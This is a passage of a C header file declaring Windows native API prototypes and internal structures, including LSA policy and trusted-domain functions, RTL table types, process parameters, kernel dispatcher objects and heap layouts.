LsaEnumerateLogonSessions(
	OUT PULONG  LogonSessionCount,
	OUT PLUID * LogonSessionList
	);

NTSTATUS
NTAPI
LsaGetLogonSessionData(
	IN PLUID LogonId,
	OUT PSECURITY_LOGON_SESSION_DATA * ppLogonSessionData
	);

#endif
NTSTATUS
NTAPI
LsaOpenPolicy(
	IN OPTIONAL PLSA_UNICODE_STRING SystemName,
	IN PLSA_OBJECT_ATTRIBUTES ObjectAttributes,
	IN ACCESS_MASK DesiredAccess,
	OUT PLSA_HANDLE PolicyHandle
	);


NTSTATUS
NTAPI
LsaQueryInformationPolicy(
	IN LSA_HANDLE PolicyHandle,
	IN POLICY_INFORMATION_CLASS InformationClass,
	OUT PVOID *Buffer
	);

NTSTATUS
NTAPI
LsaSetInformationPolicy(
	IN LSA_HANDLE PolicyHandle,
	IN POLICY_INFORMATION_CLASS InformationClass,
	IN PVOID Buffer
	);

NTSTATUS
NTAPI
LsaQueryDomainInformationPolicy(
	IN LSA_HANDLE PolicyHandle,
	IN POLICY_DOMAIN_INFORMATION_CLASS InformationClass,
	OUT PVOID *Buffer
	);

NTSTATUS
NTAPI
LsaSetDomainInformationPolicy(
	IN LSA_HANDLE PolicyHandle,
	IN POLICY_DOMAIN_INFORMATION_CLASS InformationClass,
	IN OPTIONAL PVOID Buffer
	);

NTSTATUS
NTAPI
LsaRegisterPolicyChangeNotification(
	IN POLICY_NOTIFICATION_INFORMATION_CLASS InformationClass,
	IN HANDLE NotificationEventHandle
	);

NTSTATUS
NTAPI
LsaUnregisterPolicyChangeNotification(
	IN POLICY_NOTIFICATION_INFORMATION_CLASS InformationClass,
	IN HANDLE NotificationEventHandle
	);

NTSTATUS
NTAPI
LsaEnumerateTrustedDomains(
	IN LSA_HANDLE PolicyHandle,
	IN OUT PLSA_ENUMERATION_HANDLE EnumerationContext,
	OUT PVOID *Buffer,
	IN ULONG PreferedMaximumLength,
	OUT PULONG CountReturned
	);

NTSTATUS
NTAPI
LsaLookupNames(
	IN LSA_HANDLE PolicyHandle,
	IN ULONG Count,
	IN PLSA_UNICODE_STRING Names,
	OUT PLSA_REFERENCED_DOMAIN_LIST *ReferencedDomains,
	OUT PLSA_TRANSLATED_SID *Sids
	);

#if (_WIN32_WINNT >= 0x0501)
NTSTATUS
NTAPI
LsaLookupNames2(
	IN LSA_HANDLE PolicyHandle,
	IN ULONG Flags, // Reserved
	IN ULONG Count,
	IN PLSA_UNICODE_STRING Names,
	OUT PLSA_REFERENCED_DOMAIN_LIST *ReferencedDomains,
	OUT PLSA_TRANSLATED_SID2 *Sids
	);
#endif

NTSTATUS
NTAPI
LsaLookupSids(
	IN LSA_HANDLE PolicyHandle,
	IN ULONG Count,
	IN PSID *Sids,
	OUT PLSA_REFERENCED_DOMAIN_LIST *ReferencedDomains,
	OUT PLSA_TRANSLATED_NAME *Names
	);

#define SE_INTERACTIVE_LOGON_NAME           TEXT("SeInteractiveLogonRight")
#define SE_NETWORK_LOGON_NAME               TEXT("SeNetworkLogonRight")
#define SE_BATCH_LOGON_NAME                 TEXT("SeBatchLogonRight")
#define SE_SERVICE_LOGON_NAME               TEXT("SeServiceLogonRight")
#define SE_DENY_INTERACTIVE_LOGON_NAME      TEXT("SeDenyInteractiveLogonRight")
#define SE_DENY_NETWORK_LOGON_NAME          TEXT("SeDenyNetworkLogonRight")
#define SE_DENY_BATCH_LOGON_NAME            TEXT("SeDenyBatchLogonRight")
#define SE_DENY_SERVICE_LOGON_NAME          TEXT("SeDenyServiceLogonRight")
#if (_WIN32_WINNT >= 0x0501)
#define SE_REMOTE_INTERACTIVE_LOGON_NAME    TEXT("SeRemoteInteractiveLogonRight")
#define SE_DENY_REMOTE_INTERACTIVE_LOGON_NAME TEXT("SeDenyRemoteInteractiveLogonRight")
#endif

NTSTATUS
NTAPI
LsaEnumerateAccountsWithUserRight(
	IN LSA_HANDLE PolicyHandle,
	IN OPTIONAL PLSA_UNICODE_STRING UserRight,
	OUT PVOID *Buffer,
	OUT PULONG CountReturned
	);

NTSTATUS
NTAPI
LsaEnumerateAccountRights(
	IN LSA_HANDLE PolicyHandle,
	IN PSID AccountSid,
	OUT PLSA_UNICODE_STRING *UserRights,
	OUT PULONG CountOfRights
	);

NTSTATUS
NTAPI
LsaAddAccountRights(
	IN LSA_HANDLE PolicyHandle,
	IN PSID AccountSid,
	IN PLSA_UNICODE_STRING UserRights,
	IN ULONG CountOfRights
	);

NTSTATUS
NTAPI
LsaRemoveAccountRights(
	IN LSA_HANDLE PolicyHandle,
	IN PSID AccountSid,
	IN BOOLEAN AllRights,
	IN LSA_UNICODE_STRING UserRights,
	IN ULONG CountOfRights
	);

///////////////////////////////////////////////////////////////////////////////
//                                                                           //
// Local Security Policy - Trusted Domain Object API function prototypes     //
//                                                                           //
///////////////////////////////////////////////////////////////////////////////

NTSTATUS
NTAPI
LsaOpenTrustedDomainByName(
	IN LSA_HANDLE PolicyHandle,
	IN PLSA_UNICODE_STRING TrustedDomainName,
	IN ACCESS_MASK DesiredAccess,
	OUT PLSA_HANDLE TrustedDomainHandle
	);

NTSTATUS
NTAPI
LsaQueryTrustedDomainInfo(
	IN LSA_HANDLE PolicyHandle,
	IN PSID TrustedDomainSid,
	IN TRUSTED_INFORMATION_CLASS InformationClass,
	OUT PVOID *Buffer
	);

NTSTATUS
NTAPI
LsaSetTrustedDomainInformation(
	IN LSA_HANDLE PolicyHandle,
	IN PSID TrustedDomainSid,
	IN TRUSTED_INFORMATION_CLASS InformationClass,
	IN PVOID Buffer
	);

NTSTATUS
NTAPI
LsaDeleteTrustedDomain(
	IN LSA_HANDLE PolicyHandle,
	IN PSID TrustedDomainSid
	);

NTSTATUS
NTAPI
LsaQueryTrustedDomainInfoByName(
	IN LSA_HANDLE PolicyHandle,
	IN PLSA_UNICODE_STRING TrustedDomainName,
	IN TRUSTED_INFORMATION_CLASS InformationClass,
	OUT PVOID *Buffer
	);

NTSTATUS
NTAPI
LsaSetTrustedDomainInfoByName(
	IN LSA_HANDLE PolicyHandle,
	IN PLSA_UNICODE_STRING TrustedDomainName,
	IN TRUSTED_INFORMATION_CLASS InformationClass,
	IN PVOID Buffer
	);

NTSTATUS
NTAPI
LsaEnumerateTrustedDomainsEx(
	IN LSA_HANDLE PolicyHandle,
	IN OUT PLSA_ENUMERATION_HANDLE EnumerationContext,
	OUT PVOID *Buffer,
	IN ULONG PreferedMaximumLength,
	OUT PULONG CountReturned
	);

NTSTATUS
NTAPI
LsaCreateTrustedDomainEx(
	IN LSA_HANDLE PolicyHandle,
	IN PTRUSTED_DOMAIN_INFORMATION_EX TrustedDomainInformation,
	IN PTRUSTED_DOMAIN_AUTH_INFORMATION AuthenticationInformation,
	IN ACCESS_MASK DesiredAccess,
	OUT PLSA_HANDLE TrustedDomainHandle
	);

#if (_WIN32_WINNT >= 0x0501)
NTSTATUS
NTAPI
LsaQueryForestTrustInformation(
	IN LSA_HANDLE PolicyHandle,
	IN PLSA_UNICODE_STRING TrustedDomainName,
	OUT PLSA_FOREST_TRUST_INFORMATION * ForestTrustInfo
	);

NTSTATUS
NTAPI
LsaSetForestTrustInformation(
	IN LSA_HANDLE PolicyHandle,
	IN PLSA_UNICODE_STRING TrustedDomainName,
	IN PLSA_FOREST_TRUST_INFORMATION ForestTrustInfo,
	IN BOOLEAN CheckOnly,
	OUT PLSA_FOREST_TRUST_COLLISION_INFORMATION * CollisionInfo
	);

// #define TESTING_MATCHING_ROUTINE
#ifdef TESTING_MATCHING_ROUTINE

NTSTATUS
NTAPI
LsaForestTrustFindMatch(
	IN LSA_HANDLE PolicyHandle,
	IN ULONG Type,
	IN PLSA_UNICODE_STRING Name,
	OUT PLSA_UNICODE_STRING * Match
	);

#endif
#endif

//
// This API sets the workstation password (equivalent of setting/getting
// the SSI_SECRET_NAME secret)
//

NTSTATUS
NTAPI
LsaStorePrivateData(
	IN LSA_HANDLE PolicyHandle,
	IN PLSA_UNICODE_STRING KeyName,
	IN OPTIONAL PLSA_UNICODE_STRING PrivateData
	);

NTSTATUS
NTAPI
LsaRetrievePrivateData(
	IN LSA_HANDLE PolicyHandle,
	IN PLSA_UNICODE_STRING KeyName,
	OUT PLSA_UNICODE_STRING * PrivateData
	);


ULONG
NTAPI
LsaNtStatusToWinError(
	IN NTSTATUS Status
	);

#endif // _NTLSA_IFS_
// 04.06.2011 - end

//
// Driver entry management APIs.
//

typedef struct _EFI_DRIVER_ENTRY {
	ULONG Version;
	ULONG Length;
	ULONG Id;
	ULONG FriendlyNameOffset;
	ULONG DriverFilePathOffset;
	//WCHAR FriendlyName[ANYSIZE_ARRAY];
	//FILE_PATH DriverFilePath;
} EFI_DRIVER_ENTRY, *PEFI_DRIVER_ENTRY;

typedef struct _EFI_DRIVER_ENTRY_LIST {
	ULONG NextEntryOffset;
	EFI_DRIVER_ENTRY DriverEntry;
} EFI_DRIVER_ENTRY_LIST, *PEFI_DRIVER_ENTRY_LIST;

#define EFI_DRIVER_ENTRY_VERSION 1
#define MAX_STACK_DEPTH 32

typedef struct _RTL_STACK_CONTEXT_ENTRY {
	ULONG_PTR Address; // stack address
	ULONG_PTR Data;    // stack contents
} RTL_STACK_CONTEXT_ENTRY, * PRTL_STACK_CONTEXT_ENTRY;

typedef struct _RTL_STACK_CONTEXT {
	ULONG NumberOfEntries;
	RTL_STACK_CONTEXT_ENTRY Entry[1];
} RTL_STACK_CONTEXT, * PRTL_STACK_CONTEXT;

typedef NTSTATUS
	(NTAPI * PRTL_HEAP_COMMIT_ROUTINE)(
	IN PVOID Base,
	IN OUT PVOID *CommitAddress,
	IN OUT PSIZE_T CommitSize
	);

typedef struct _RTL_HEAP_PARAMETERS
{
	ULONG Length;
	SIZE_T SegmentReserve;
	SIZE_T SegmentCommit;
	SIZE_T DeCommitFreeBlockThreshold;
	SIZE_T DeCommitTotalFreeThreshold;
	SIZE_T MaximumAllocationSize;
	SIZE_T VirtualMemoryThreshold;
	SIZE_T InitialCommit;
	SIZE_T InitialReserve;
	PRTL_HEAP_COMMIT_ROUTINE CommitRoutine;
	SIZE_T Reserved[2];
} RTL_HEAP_PARAMETERS, *PRTL_HEAP_PARAMETERS;

#define HEAP_SETTABLE_USER_VALUE 0x00000100
#define HEAP_SETTABLE_USER_FLAG1 0x00000200
#define HEAP_SETTABLE_USER_FLAG2 0x00000400
#define HEAP_SETTABLE_USER_FLAG3 0x00000800
#define HEAP_SETTABLE_USER_FLAGS 0x00000e00

#define HEAP_CLASS_0 0x00000000 // Process heap
#define HEAP_CLASS_1 0x00001000 // Private heap
#define HEAP_CLASS_2 0x00002000 // Kernel heap
#define HEAP_CLASS_3 0x00003000 // GDI heap
#define HEAP_CLASS_4 0x00004000 // User heap
#define HEAP_CLASS_5 0x00005000 // Console heap
#define HEAP_CLASS_6 0x00006000 // User desktop heap
#define HEAP_CLASS_7 0x00007000 // CSR shared heap
#define HEAP_CLASS_8 0x00008000 // CSR port heap
#define HEAP_CLASS_MASK 0x0000f000

struct _RTL_AVL_TABLE;

typedef struct _RTL_SPLAY_LINKS {
	struct _RTL_SPLAY_LINKS *Parent;
	struct _RTL_SPLAY_LINKS *LeftChild;
	struct _RTL_SPLAY_LINKS *RightChild;
} RTL_SPLAY_LINKS;
typedef RTL_SPLAY_LINKS *PRTL_SPLAY_LINKS;

typedef enum _TABLE_SEARCH_RESULT
{
	TableEmptyTree,
	TableFoundNode,
	TableInsertAsLeft,
	TableInsertAsRight
} TABLE_SEARCH_RESULT;

typedef enum _RTL_GENERIC_COMPARE_RESULTS
{
	GenericLessThan,
	GenericGreaterThan,
	GenericEqual
} RTL_GENERIC_COMPARE_RESULTS;

struct _RTL_AVL_TABLE;

typedef RTL_GENERIC_COMPARE_RESULTS (NTAPI *PRTL_AVL_COMPARE_ROUTINE)(
	IN struct _RTL_AVL_TABLE *Table,
	IN PVOID FirstStruct,
	IN PVOID SecondStruct
	);

typedef PVOID (NTAPI *PRTL_AVL_ALLOCATE_ROUTINE)(
	IN struct _RTL_AVL_TABLE *Table,
	IN CLONG ByteSize
	);

typedef VOID (NTAPI *PRTL_AVL_FREE_ROUTINE)(
	IN struct _RTL_AVL_TABLE *Table,
	IN	PVOID Buffer
	);

typedef NTSTATUS (NTAPI *PRTL_AVL_MATCH_FUNCTION)(
	IN struct _RTL_AVL_TABLE *Table,
	IN PVOID UserData,
	IN PVOID MatchData
	);

typedef
	RTL_GENERIC_COMPARE_RESULTS
	(NTAPI *PRTL_AVL_COMPARE_ROUTINE) (
	struct _RTL_AVL_TABLE *Table,
	PVOID FirstStruct,
	PVOID SecondStruct
	);

typedef
	PVOID
	(NTAPI *PRTL_AVL_ALLOCATE_ROUTINE) (
	struct _RTL_AVL_TABLE *Table,
	ULONG ByteSize
	);


typedef
	NTSTATUS
	(NTAPI *PRTL_AVL_MATCH_FUNCTION) (
	struct _RTL_AVL_TABLE *Table,
	PVOID UserData,
	PVOID MatchData
	);

typedef
	RTL_GENERIC_COMPARE_RESULTS
	(NTAPI *PRTL_GENERIC_COMPARE_ROUTINE) (
	struct _RTL_GENERIC_TABLE *Table,
	PVOID FirstStruct,
	PVOID SecondStruct
	);

typedef
	PVOID
	(NTAPI *PRTL_GENERIC_ALLOCATE_ROUTINE) (
	struct _RTL_GENERIC_TABLE *Table,
	ULONG ByteSize
	);

typedef
	VOID
	(NTAPI *PRTL_GENERIC_FREE_ROUTINE) (
	struct _RTL_GENERIC_TABLE *Table,
	PVOID Buffer
	);

typedef struct _RTL_BALANCED_LINKS
{
	struct _RTL_BALANCED_LINKS *Parent;
	struct _RTL_BALANCED_LINKS *LeftChild;
	struct _RTL_BALANCED_LINKS *RightChild;
	CHAR Balance;
	UCHAR Reserved[3];
} RTL_BALANCED_LINKS, *PRTL_BALANCED_LINKS;

typedef struct _RTL_AVL_TABLE
{
	RTL_BALANCED_LINKS BalancedRoot;
	PVOID OrderedPointer;
	ULONG WhichOrderedElement;
	ULONG NumberGenericTableElements;
	ULONG DepthOfTree;
	PRTL_BALANCED_LINKS RestartKey;
	ULONG DeleteCount;
	PRTL_AVL_COMPARE_ROUTINE CompareRoutine;
	PRTL_AVL_ALLOCATE_ROUTINE AllocateRoutine;
	PRTL_AVL_FREE_ROUTINE FreeRoutine;
	PVOID TableContext;
} RTL_AVL_TABLE, *PRTL_AVL_TABLE;

typedef struct _RTL_GENERIC_TABLE {
	PRTL_SPLAY_LINKS TableRoot;
	LIST_ENTRY InsertOrderList;
	PLIST_ENTRY OrderedPointer;
	ULONG WhichOrderedElement;
	ULONG NumberGenericTableElements;
	PRTL_GENERIC_COMPARE_ROUTINE CompareRoutine;
	PRTL_GENERIC_ALLOCATE_ROUTINE AllocateRoutine;
	PRTL_GENERIC_FREE_ROUTINE FreeRoutine;
	PVOID TableContext;
} RTL_GENERIC_TABLE;
typedef RTL_GENERIC_TABLE *PRTL_GENERIC_TABLE;

typedef struct _GENERATE_NAME_CONTEXT {

	USHORT Checksum;
	BOOLEAN ChecksumInserted;

	UCHAR NameLength;         // not including extension
	WCHAR NameBuffer[8];      // e.g., "ntoskrnl"

	ULONG ExtensionLength;    // including dot
	WCHAR ExtensionBuffer[4]; // e.g., ".exe"

	ULONG LastIndexValue;

} GENERATE_NAME_CONTEXT;
typedef GENERATE_NAME_CONTEXT *PGENERATE_NAME_CONTEXT;

typedef struct _PREFIX_TABLE_ENTRY {
	CSHORT NodeTypeCode;
	CSHORT NameLength;
	struct _PREFIX_TABLE_ENTRY *NextPrefixTree;
	RTL_SPLAY_LINKS Links;
	PSTRING Prefix;
} PREFIX_TABLE_ENTRY;
typedef PREFIX_TABLE_ENTRY *PPREFIX_TABLE_ENTRY;

typedef struct _PREFIX_TABLE {
	CSHORT NodeTypeCode;
	CSHORT NameLength;
	PPREFIX_TABLE_ENTRY NextPrefixTree;
} PREFIX_TABLE;
typedef PREFIX_TABLE *PPREFIX_TABLE;

typedef struct _UNICODE_PREFIX_TABLE_ENTRY {
	CSHORT NodeTypeCode;
	CSHORT NameLength;
	struct _UNICODE_PREFIX_TABLE_ENTRY *NextPrefixTree;
	struct _UNICODE_PREFIX_TABLE_ENTRY *CaseMatch;
	RTL_SPLAY_LINKS Links;
	PUNICODE_STRING Prefix;
} UNICODE_PREFIX_TABLE_ENTRY;
typedef UNICODE_PREFIX_TABLE_ENTRY *PUNICODE_PREFIX_TABLE_ENTRY;

typedef struct _UNICODE_PREFIX_TABLE {
	CSHORT NodeTypeCode;
	CSHORT NameLength;
	PUNICODE_PREFIX_TABLE_ENTRY NextPrefixTree;
	PUNICODE_PREFIX_TABLE_ENTRY LastNextEntry;
} UNICODE_PREFIX_TABLE;
typedef UNICODE_PREFIX_TABLE *PUNICODE_PREFIX_TABLE;

#define COMPRESSION_FORMAT_NONE          (0x0000)   // winnt
#define COMPRESSION_FORMAT_DEFAULT       (0x0001)   // winnt
#define COMPRESSION_FORMAT_LZNT1         (0x0002)   // winnt

#define COMPRESSION_ENGINE_STANDARD      (0x0000)   // winnt
#define COMPRESSION_ENGINE_MAXIMUM       (0x0100)   // winnt
#define COMPRESSION_ENGINE_HIBER         (0x0200)   // winnt

typedef struct _COMPRESSED_DATA_INFO {

	USHORT CompressionFormatAndEngine;

	UCHAR CompressionUnitShift;
	UCHAR ChunkShift;
	UCHAR ClusterShift;
	UCHAR Reserved;
	USHORT NumberOfChunks;
	ULONG CompressedChunkSizes[ANYSIZE_ARRAY];

} COMPRESSED_DATA_INFO;
typedef COMPRESSED_DATA_INFO *PCOMPRESSED_DATA_INFO;

typedef struct _SECTION_IMAGE_INFORMATION {
	PVOID TransferAddress;
	ULONG ZeroBits;
	UCHAR Alignment[4];
	SIZE_T MaximumStackSize;
	SIZE_T CommittedStackSize;
	ULONG SubSystemType;
	union {
		struct {
			USHORT SubSystemMinorVersion;
			USHORT SubSystemMajorVersion;
		};
		ULONG SubSystemVersion;
	};
	ULONG GpValue;
	USHORT ImageCharacteristics;
	USHORT DllCharacteristics;
	USHORT Machine;
	BOOLEAN ImageContainsCode;
	union
	{
		UCHAR	ImageFlags;
		struct 
		{
			BOOLEAN ComPlusNativeReady : 1;
			BOOLEAN ComPlusILOnly : 1;
			BOOLEAN ImageDynamicallyRelocated : 1;
			BOOLEAN ImageMappedFlat : 1;
			BOOLEAN Reserved : 4;
		};
	};

	ULONG LoaderFlags;
	ULONG ImageFileSize;
	ULONG CheckSum;
} SECTION_IMAGE_INFORMATION, *PSECTION_IMAGE_INFORMATION;

typedef struct _SECTION_IMAGE_INFORMATION64 {
	ULONGLONG TransferAddress;
	ULONG ZeroBits;
	ULONGLONG MaximumStackSize;
	ULONGLONG CommittedStackSize;
	ULONG SubSystemType;
	union {
		struct {
			USHORT SubSystemMinorVersion;
			USHORT SubSystemMajorVersion;
		};
		ULONG SubSystemVersion;
	};
	ULONG GpValue;
	USHORT ImageCharacteristics;
	USHORT DllCharacteristics;
	USHORT Machine;
	BOOLEAN ImageContainsCode;
	BOOLEAN Spare1;
	ULONG LoaderFlags;
	ULONG ImageFileSize;
	ULONG Reserved[ 1 ];
} SECTION_IMAGE_INFORMATION64, *PSECTION_IMAGE_INFORMATION64;

typedef struct _RTL_BITMAP {
	ULONG SizeOfBitMap;
	UCHAR Padding[4];
	PULONG Buffer;
} RTL_BITMAP;
typedef RTL_BITMAP *PRTL_BITMAP;

#define RTL_USER_PROC_CURDIR_CLOSE      0x00000002
#define RTL_USER_PROC_CURDIR_INHERIT    0x00000003

#define RTL_RANGE_SHARED    0x01
#define RTL_RANGE_CONFLICT  0x02

typedef struct _RTL_RANGE_LIST {
	LIST_ENTRY ListHead;
	ULONG Flags;        // use RANGE_LIST_FLAG_*
	ULONG Count;
	ULONG Stamp;
} RTL_RANGE_LIST, *PRTL_RANGE_LIST;

typedef enum {
	RtlBsdItemVersionNumber = 0x00,
	RtlBsdItemProductType,
	RtlBsdItemAabEnabled,
	RtlBsdItemAabTimeout,
	RtlBsdItemBootGood,
	RtlBsdItemBootShutdown,
	RtlBsdItemMax
} RTL_BSD_ITEM_TYPE, *PRTL_BSD_ITEM_TYPE;

typedef struct _RANGE_LIST_ITERATOR {
	PLIST_ENTRY RangeListHead;
	PLIST_ENTRY MergedHead;
	PVOID Current;
	ULONG Stamp;
} RTL_RANGE_LIST_ITERATOR, *PRTL_RANGE_LIST_ITERATOR;

typedef struct _STARTUP_ARGUMENT
{
	//ULONG Unknown[ 3 ];
	UNICODE_STRING Unknown[ 3 ];
	PRTL_USER_PROCESS_PARAMETERS Environment;
} STARTUP_ARGUMENT, *PSTARTUP_ARGUMENT;

#define RTL_USER_PROC_PARAMS_NORMALIZED     0x00000001
#define RTL_USER_PROC_PROFILE_USER          0x00000002
#define RTL_USER_PROC_PROFILE_KERNEL        0x00000004
#define RTL_USER_PROC_PROFILE_SERVER        0x00000008
#define RTL_USER_PROC_RESERVE_1MB           0x00000020
#define RTL_USER_PROC_RESERVE_16MB          0x00000040
#define RTL_USER_PROC_CASE_SENSITIVE        0x00000080
#define RTL_USER_PROC_DISABLE_HEAP_DECOMMIT 0x00000100
#define RTL_USER_PROC_DLL_REDIRECTION_LOCAL 0x00001000
#define RTL_USER_PROC_APP_MANIFEST_PRESENT  0x00002000
#define RTL_USER_PROC_IMAGE_KEY_MISSING     0x00004000
#define RTL_USER_PROC_OPTIN_PROCESS         0x00020000

typedef NTSTATUS (*PUSER_PROCESS_START_ROUTINE)(
	PRTL_USER_PROCESS_PARAMETERS ProcessParameters
	);

typedef NTSTATUS (*PUSER_THREAD_START_ROUTINE)(
	PVOID ThreadParameter
	);

typedef struct _RTL_USER_PROCESS_INFORMATION {
	ULONG Length;
	HANDLE Process;
	HANDLE Thread;
	CLIENT_ID ClientId;
	SECTION_IMAGE_INFORMATION ImageInformation;
} RTL_USER_PROCESS_INFORMATION, *PRTL_USER_PROCESS_INFORMATION;

typedef struct _RTL_USER_PROCESS_INFORMATION64 {
	ULONG Length;
	LONGLONG Process;
	LONGLONG Thread;
	CLIENT_ID64 ClientId;
	SECTION_IMAGE_INFORMATION64 ImageInformation;
} RTL_USER_PROCESS_INFORMATION64, *PRTL_USER_PROCESS_INFORMATION64;

#define RTL_TRACE_IN_USER_MODE       0x00000001
#define RTL_TRACE_IN_KERNEL_MODE     0x00000002
#define RTL_TRACE_USE_NONPAGED_POOL  0x00000004
#define RTL_TRACE_USE_PAGED_POOL     0x00000008

typedef struct _RTL_RESOURCE {

	RTL_CRITICAL_SECTION CriticalSection;

	HANDLE SharedSemaphore;
	ULONG NumberOfWaitingShared;
	HANDLE ExclusiveSemaphore;
	ULONG NumberOfWaitingExclusive;

	LONG NumberOfActive;
	HANDLE ExclusiveOwnerThread;

	ULONG Flags;        // See RTL_RESOURCE_FLAG_ equates below.

	PRTL_RESOURCE_DEBUG DebugInfo;
} RTL_RESOURCE, *PRTL_RESOURCE;

#define RTL_RESOURCE_FLAG_LONG_TERM     ((ULONG) 0x00000001)

typedef struct _RTL_TRACE_BLOCK {
	ULONG Magic;
	ULONG Count;
	ULONG Size;

	SIZE_T UserCount;
	SIZE_T UserSize;
	PVOID UserContext;

	struct _RTL_TRACE_BLOCK * Next;
	PVOID * Trace;
} RTL_TRACE_BLOCK, * PRTL_TRACE_BLOCK;

typedef ULONG (* RTL_TRACE_HASH_FUNCTION) (ULONG Count, PVOID * Trace);
typedef struct _RTL_TRACE_DATABASE * PRTL_TRACE_DATABASE;

typedef struct _RTL_TRACE_ENUMERATE {
	PRTL_TRACE_DATABASE Database;
	ULONG Index;
	PRTL_TRACE_BLOCK Block;
} RTL_TRACE_ENUMERATE, * PRTL_TRACE_ENUMERATE;

typedef struct _KLDR_DATA_TABLE_ENTRY
{
	LIST_ENTRY InLoadOrderLinks;
	PVOID ExceptionTable;
	ULONG ExceptionTableSize;
	PVOID GpValue;
	struct _NON_PAGED_DEBUG_INFO* NonPagedDebugInfo;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	ULONG Flags;
	USHORT LoadCount;
	USHORT __Unused5;
	PVOID SectionPointer;
	ULONG CheckSum;
	ULONG CoverageSectionSize;
	PVOID CoverageSection;
	PVOID LoadedImports;
	PVOID PatchInformation;
} KLDR_DATA_TABLE_ENTRY, *PKLDR_DATA_TABLE_ENTRY;	// <size 0x54>

#define RTL_HEAP_BUSY               (USHORT)0x0001
#define RTL_HEAP_SEGMENT            (USHORT)0x0002
#define RTL_HEAP_SETTABLE_VALUE     (USHORT)0x0010
#define RTL_HEAP_SETTABLE_FLAG1     (USHORT)0x0020
#define RTL_HEAP_SETTABLE_FLAG2     (USHORT)0x0040
#define RTL_HEAP_SETTABLE_FLAG3     (USHORT)0x0080
#define RTL_HEAP_SETTABLE_FLAGS     (USHORT)0x00E0
#define RTL_HEAP_UNCOMMITTED_RANGE  (USHORT)0x0100
#define RTL_HEAP_PROTECTED_ENTRY    (USHORT)0x0200

#pragma warning(disable: 4273) // nconsistent dll linkage (winnt.h)

typedef struct _DISPATCHER_HEADER
{
	union
	{
		struct
		{
			UCHAR Type;
			union
			{
				UCHAR Absolute;
				UCHAR NpxIrql;
			};

			union
			{
				UCHAR Size;
				UCHAR Hand;
			};

			union
			{
				UCHAR Inserted;
				BOOLEAN DebugActive;
			};

		};	// struct ..
		volatile LONG Lock;
	};	// first union ..

	LONG SignalState;
	LIST_ENTRY WaitListHead;
} DISPATCHER_HEADER, *PDISPATCHER_HEADER;

typedef struct _KEVENT
{
	DISPATCHER_HEADER Header;
} KEVENT, *PKEVENT, *PRKEVENT;

typedef struct _KGATE
{
	DISPATCHER_HEADER Header;
} KGATE, *PKGATE;

typedef struct _KSEMAPHORE
{
	DISPATCHER_HEADER Header;
	LONG Limit;
} KSEMAPHORE, *PKSEMAPHORE;		// <size 0x14>

typedef struct _OWNER_ENTRY
{
	ULONG OwnerThread;
	LONG OwnerCount;
	ULONG TableSize;
} OWNER_ENTRY, *POWNER_ENTRY;		// <size 0x8>

typedef struct _ERESOURCE
{
	LIST_ENTRY SystemResourcesList;
	OWNER_ENTRY* OwnerTable;
	SHORT ActiveCount;
	USHORT Flag;
	KSEMAPHORE* SharedWaiters;
	KEVENT* ExclusiveWaiters;
	OWNER_ENTRY OwnerEntry;
	ULONG ActiveEntries;
	ULONG ContentionCount;
	ULONG NumberOfSharedWaiters;
	ULONG NumberOfExclusiveWaiters;
	PVOID Address;
	ULONG CreatorBackTraceIndex;
	ULONG SpinLock;
} ERESOURCE, *PERESOURCE;		// <size 0x38>

#define SET_LAST_STATUS(S)NtCurrentTeb()->LastErrorValue = RtlNtStatusToDosError(NtCurrentTeb()->LastStatusValue = (ULONG)(S))

#define HEAP_GRANULARITY            (sizeof( HEAP_ENTRY ))
#define HEAP_GRANULARITY_SHIFT      3

#define HEAP_MAXIMUM_BLOCK_SIZE     (USHORT)(((0x10000 << HEAP_GRANULARITY_SHIFT) - PAGE_SIZE) >> HEAP_GRANULARITY_SHIFT)

#define HEAP_MAXIMUM_FREELISTS 128
#define HEAP_MAXIMUM_SEGMENTS 16

#define HEAP_ENTRY_BUSY             0x01
#define HEAP_ENTRY_EXTRA_PRESENT    0x02
#define HEAP_ENTRY_FILL_PATTERN     0x04
#define HEAP_ENTRY_VIRTUAL_ALLOC    0x08
#define HEAP_ENTRY_LAST_ENTRY       0x10
#define HEAP_ENTRY_SETTABLE_FLAG1   0x20
#define HEAP_ENTRY_SETTABLE_FLAG2   0x40
#define HEAP_ENTRY_SETTABLE_FLAG3   0x80
#define HEAP_ENTRY_SETTABLE_FLAGS   0xE0

typedef struct _HEAP_LOCK
{
	union
	{
		RTL_CRITICAL_SECTION CriticalSection;
		ERESOURCE Resource;
	} Lock;
} HEAP_LOCK, *PHEAP_LOCK;

typedef struct _HEAP_TUNING_PARAMETERS
{
	ULONG CommittThresholdShift;
	ULONG MaxPreCommittThreshold;
} HEAP_TUNING_PARAMETERS, *PHEAP_TUNING_PARAMETERS;		// <size 0x8>

typedef struct _HEAP_PSEUDO_TAG_ENTRY
{
	ULONG Allocs;
	ULONG Frees;
	ULONG Size;
} HEAP_PSEUDO_TAG_ENTRY, *PHEAP_PSEUDO_TAG_ENTRY;	// <size 0xc>

typedef struct _HEAP_TAG_ENTRY
{
	ULONG Allocs;
	ULONG Frees;
	ULONG Size;
	USHORT TagIndex;
	USHORT CreatorBackTraceIndex;
	WCHAR TagName[ 24 ];
} HEAP_TAG_ENTRY, *PHEAP_TAG_ENTRY;		// <size 0x40>

typedef struct _HEAP_ENTRY
{
	USHORT Size;
	UCHAR Flags;
	UCHAR SmallTagIndex;
	PVOID SubSegmentCode;
	USHORT PreviousSize;
	UCHAR SegmentOffset;
	UCHAR LFHFlags;
	UCHAR UnusedBytes;
	USHORT FunctionIndex;
	USHORT ContextValue;
	ULONG InterceptorValue;
	USHORT UnusedBytesLength;
	UCHAR EntryOffset;
	UCHAR ExtendedBlockSignature;
	ULONG Code1;
	USHORT Code2;
	UCHAR Code3;
	UCHAR Code4;
	ULONG64 AgregateCode;
} HEAP_ENTRY, *PHEAP_ENTRY;

typedef struct _HEAP_COUNTERS
{
	ULONG TotalMemoryReserved;
	ULONG TotalMemoryCommitted;
	ULONG TotalMemoryLargeUCR;
	ULONG TotalSizeInVirtualBlocks;
	ULONG TotalSegments;
	ULONG TotalUCRs;
	ULONG CommittOps;
	ULONG DeCommitOps;
	ULONG LockAcquires;
	ULONG LockCollisions;
	ULONG CommitRate;
	ULONG DecommittRate;
	ULONG CommitFailures;
	ULONG InBlockCommitFailures;
	ULONG CompactHeapCalls;
	ULONG CompactedUCRs;
	ULONG InBlockDeccommits;
	ULONG InBlockDeccomitSize;
